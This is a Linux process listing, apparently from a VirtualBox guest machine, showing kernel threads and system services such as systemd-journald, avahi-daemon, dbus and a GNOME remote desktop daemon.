    PID USER         ELAPSED COMMAND
      1 root        01:50:49 /sbin/init splash
      2 root        01:50:49 [kthreadd]
      3 root        01:50:49 [pool_workqueue_release]
      4 root        01:50:49 [kworker/R-rcu_gp]
      5 root        01:50:49 [kworker/R-sync_wq]
      6 root        01:50:49 [kworker/R-kvfree_rcu_reclaim]
      7 root        01:50:49 [kworker/R-slub_flushwq]
      8 root        01:50:49 [kworker/R-netns]
     12 root        01:50:49 [kworker/u8:0-ipv6_addrconf]
     13 root        01:50:49 [kworker/R-mm_percpu_wq]
     14 root        01:50:49 [rcu_tasks_kthread]
     15 root        01:50:49 [rcu_tasks_rude_kthread]
     16 root        01:50:49 [rcu_tasks_trace_kthread]
     17 root        01:50:49 [ksoftirqd/0]
     18 root        01:50:49 [rcu_preempt]
     19 root        01:50:49 [rcu_exp_par_gp_kthread_worker/0]
     20 root        01:50:49 [rcu_exp_gp_kthread_worker]
     21 root        01:50:49 [migration/0]
     22 root        01:50:49 [idle_inject/0]
     23 root        01:50:49 [cpuhp/0]
     24 root        01:50:49 [cpuhp/1]
     25 root        01:50:49 [idle_inject/1]
     26 root        01:50:49 [migration/1]
     27 root        01:50:49 [ksoftirqd/1]
     32 root        01:50:49 [kdevtmpfs]
     33 root        01:50:49 [kworker/R-inet_frag_wq]
     34 root        01:50:49 [kauditd]
     35 root        01:50:49 [khungtaskd]
     36 root        01:50:49 [oom_reaper]
     38 root        01:50:49 [kworker/R-writeback]
     39 root        01:50:49 [kcompactd0]
     41 root        01:50:49 [ksmd]
     42 root        01:50:49 [khugepaged]
     43 root        01:50:49 [kworker/R-kintegrityd]
     44 root        01:50:49 [kworker/R-kblockd]
     45 root        01:50:49 [kworker/R-blkcg_punt_bio]
     46 root        01:50:49 [irq/9-acpi]
     47 root        01:50:49 [kworker/R-tpm_dev_wq]
     48 root        01:50:49 [kworker/R-ata_sff]
     49 root        01:50:49 [kworker/R-md]
     50 root        01:50:49 [kworker/R-md_bitmap]
     51 root        01:50:49 [kworker/R-edac-poller]
     52 root        01:50:49 [kworker/R-devfreq_wq]
     53 root        01:50:49 [watchdogd]
     54 root        01:50:49 [kworker/0:1H-kblockd]
     55 root        01:50:49 [kswapd0]
     56 root        01:50:49 [ecryptfs-kthread]
     57 root        01:50:49 [kworker/R-kthrotld]
     58 root        01:50:49 [kworker/R-acpi_thermal_pm]
     60 root        01:50:49 [scsi_eh_0]
     61 root        01:50:49 [kworker/R-scsi_tmf_0]
     62 root        01:50:49 [scsi_eh_1]
     63 root        01:50:49 [kworker/R-scsi_tmf_1]
     67 root        01:50:49 [kworker/1:1H-kblockd]
     68 root        01:50:49 [kworker/R-mld]
     69 root        01:50:49 [kworker/R-ipv6_addrconf]
     70 root        01:50:49 [kworker/u8:1-ipv6_addrconf]
     78 root        01:50:49 [kworker/R-kstrp]
     80 root        01:50:49 [kworker/u11:0]
     81 root        01:50:49 [kworker/u12:0-ttm]
     82 root        01:50:49 [kworker/u13:0-ttm]
     95 root        01:50:49 [kworker/R-charger_manager]
    145 root        01:50:49 [scsi_eh_2]
    146 root        01:50:49 [kworker/R-scsi_tmf_2]
    201 root        01:50:43 [jbd2/sda2-8]
    202 root        01:50:43 [kworker/R-ext4-rsv-conversion]
    250 root        01:50:43 /usr/lib/systemd/systemd-journald
    322 root        01:50:41 /usr/lib/systemd/systemd-udevd
    372 root        01:50:41 [psimon]
    415 systemd+    01:50:41 /usr/lib/systemd/systemd-oomd
    418 systemd+    01:50:41 /usr/lib/systemd/systemd-resolved
    564 root        01:50:41 [kworker/R-cryptd]
    573 root        01:50:40 [irq/18-vmwgfx]
    576 root        01:50:40 [kworker/R-ttm]
    681 avahi       01:50:40 avahi-daemon: running [mark-VirtualBox-2.local]
    685 message+    01:50:40 @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
    690 gnome-r+    01:50:40 /usr/libexec/gnome-remote-desktop-daemon --system
